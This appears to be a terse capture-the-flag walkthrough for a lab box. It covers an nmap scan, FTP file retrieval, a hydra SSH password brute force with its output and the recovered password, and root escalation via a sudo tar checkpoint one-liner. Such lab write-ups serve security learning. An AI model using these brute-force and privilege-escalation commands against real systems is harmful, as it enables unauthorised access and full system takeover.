
1. Scan: `nmap -sC -sV -A -T4 -v -p- -oN nmap/nmap.initial $IP`

2. Open SSH, FTP, and webserver 

3. Get files from FTP

4. Run hydra for user `lin`

```
hydra -l lin -P locks.txt $IP ssh                                                                                                            3s ○ cha-eks-3/enapi1-dev
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-09 15:45:08
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
[DATA] attacking ssh://10.10.153.36:22/
[22][ssh] host: 10.10.153.36   login: lin   password: RedDr4gonSynd1cat3
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-09-09 15:45:14
```

5. SSH into the box
6. Get user flag from home
7. Run sudo -l and search for tar on gtfobins
8. Get root shell: `sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`
9. Get flag from root home
